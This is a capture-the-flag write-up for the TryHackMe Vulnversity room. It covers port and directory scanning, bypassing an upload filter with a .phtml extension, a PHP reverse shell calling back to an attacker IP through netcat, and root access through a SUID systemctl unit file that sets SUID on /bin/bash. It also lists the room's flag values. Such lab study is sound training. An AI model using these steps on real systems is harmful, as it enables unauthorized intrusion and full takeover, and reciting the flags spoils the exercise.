# VulnUniversity — TryHackMe

**Difficulty:** Easy  
**Platform:** TryHackMe  
**Date:** June 15, 2026

---

## What's this room about?

VulnUniversity is a beginner-friendly room that walks you through a pretty realistic attack chain — scan a box, find a web app, exploit a file upload, get a shell, then escalate to root using a misconfigured SUID binary. Good room to practice the basics.

---

## Tools used

- `nmap`
- `gobuster`
- Burp Suite (Intruder)
- netcat
- PentestMonkey PHP reverse shell

---

## Walkthrough

### 1. Scanning the target

Started with an Nmap version scan to discover open ports and services:

```bash
nmap -sV <target-ip>
```

![Nmap scan initialization](screenshots/01-nmap-initial-scan.png)

![Nmap scan results](screenshots/02-nmap-scan-results.png)

Got back 6 open ports:

```
21   - FTP   (vsftpd 3.0.5)
22   - SSH   (OpenSSH 8.2p1)
139  - Samba
445  - Samba
3128 - Squid proxy
3333 - Apache 2.4.41
```

Port 3333 is where the web server is. Non-standard port, so easy to miss if you're not doing a proper version scan.

---

### 2. Finding hidden directories

Ran Gobuster to search for hidden directories on the web server running on port 3333:

```bash
gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster scan initialization and first attempt](screenshots/03-nmap-scan-details.png)

![Gobuster scan results showing /internal directory](screenshots/04-nmap-scan-complete.png)

Found a `/internal` directory — this turned out to be a file upload page.

---

### 3. The upload page

Navigated to the `/internal/` directory at `http://<target-ip>:3333/internal/` and discovered a file upload form. 

![File upload page](screenshots/05-gobuster-scan.png)

Attempting to upload a standard `.php` file resulted in an "Extension not allowed" error message, confirming client/server-side extension filtering is in place.

![Extension not allowed error](screenshots/06-gobuster-scan-2.png)

![Upload error validation](screenshots/07-gobuster-results.png)

So there's a filter, but these are usually bypassable. Time for Burp.

---

### 4. Bypassing the file upload filter with Burp

To bypass this filter, the file upload request was intercepted using Burp Suite.

![Burp Suite HTTP history showing file upload request](screenshots/08-gobuster-findings.png)

The request was sent to Burp Intruder, configuring the file extension as the payload position (e.g., `phpexts.§php§`). A simple list of PHP-related extensions was set up: `.php`, `.php3`, `.php4`, `.php5`, and `.phtml`.

![Burp Intruder payload configuration](screenshots/09-web-internal-page.png)

The attack was launched. Analyzing the response lengths revealed that the `.phtml` extension returned a different response status/length (or success indicator) than the others, indicating it was successfully accepted by the server.

![Burp Intruder results identifying .phtml extension success](screenshots/10-burp-intercept.png)

---

### 5. Getting a shell

Downloaded the PentestMonkey PHP reverse shell script and renamed it to use the allowed `.phtml` extension:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php php-reverse-shell.phtml
```

![Downloading and renaming reverse shell](screenshots/11-extension-testing.png)

Edited the `$ip` and `$port` parameters inside the script to point back to the Attacker Box IP and listener port using GNU nano:

```php
$ip = '<attacker-ip>';
$port = 1234;
```

![Modifying reverse shell configuration in nano](screenshots/12-phtml-accepted.png)

Set up a netcat listener on the specified port:

```bash
nc -lvnp 1234
```

Uploaded the configured `php-reverse-shell.phtml` shell through the `/internal` upload page. The server responded with a "Success" message:

![Successful reverse shell upload](screenshots/13-reverse-shell-upload.png)

Triggered the reverse shell by navigating to `http://<target-ip>:3333/internal/uploads/php-reverse-shell.phtml`. The netcat listener caught the incoming connection as the `www-data` user:

![Netcat listener catching incoming reverse shell](screenshots/14-nc-listener.png)

Stabilized the shell using Python to spawn a fully interactive tty bash session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![Stabilizing shell connection via python pty](screenshots/15-shell-obtained.png)

*(Note: If the initial shell session gets disconnected, a new netcat listener can be re-run to re-acquire the shell).*

![Active shell session re-establishment](screenshots/16-shell-enumeration.png)

---

### 6. User flag

Checked `/etc/passwd` for users on the system with login shells:

```bash
cat /etc/passwd | grep "/bin/bash"
```

![Enumerating passwd file to discover users](screenshots/17-user-flag.png)

Discovered the user `bill`. Located `user.txt` in bill's home directory and read the user flag:

```bash
cat /home/bill/user.txt
```

![Reading user flag from bill home directory](screenshots/18-suid-enumeration.png)

**User flag:** `8bd7992fbe8a6ad22a63361004cfcedb`

---

### 7. Privilege escalation

Conducted a search for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The binary `/bin/systemctl` was found to have the SUID bit set. According to GTFOBins, this can be exploited to escalate privileges by executing a custom systemd service wrapper.

To exploit this, we construct a temporary systemd unit file that sets the SUID bit (`chmod u+s`) on `/bin/bash` when executed, then link and enable/run the service using `systemctl`:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod u+s /bin/bash"' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $(basename $TF)
```

![Creating and registering SUID systemctl exploit service](screenshots/19-systemctl-suid.png)

Start the service to execute the wrapper, then verify that the SUID permission bit has been successfully applied to `/bin/bash`:

```bash
/bin/systemctl start $(basename $TF)
ls -l /bin/bash
```

![Running exploit service and verifying bash SUID permissions](screenshots/20-privesc-service.png)

---

### 8. Root

Execute the SUID bash binary with the `-p` parameter to spawn a root shell, and verify current privileges:

```bash
/bin/bash -p
whoami
```

![Spawning SUID root shell](screenshots/21-suid-bash.png)

Verify user ID and effective root group ownership:

```bash
id
```

![Verifying root privileges](screenshots/22-root-shell.png)

Finally, read the root flag located at `/root/root.txt`:

```bash
cat /root/root.txt
```

![Reading root flag](screenshots/23-root-flag.png)

**Root flag:** `a58ff8579f0a9270368d33a9966c7fd5`

---

### Done

![room complete](screenshots/24-post-exploit.png)

---

## Flags

| Flag | Value |
|---|---|
| User | `8bd7992fbe8a6ad22a63361004cfcedb` |
| Root | `a58ff8579f0a9270368d33a9966c7fd5` |

---

## Key takeaways

- Always scan with `-sV`, services on weird ports are easy to miss
- File upload filters based on extension blacklists are weak — `.phtml` runs as PHP on Apache
- SUID on `systemctl` is a massive misconfiguration, check GTFOBins whenever you find unusual SUID binaries
- Stabilise your shell before doing anything, raw netcat shells are painful to work with

---

## Resources-

- [GTFOBins - systemctl](https://gtfobins.github.io/gtfobins/systemctl/)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [TryHackMe Room](https://tryhackme.com/room/vulnversity)
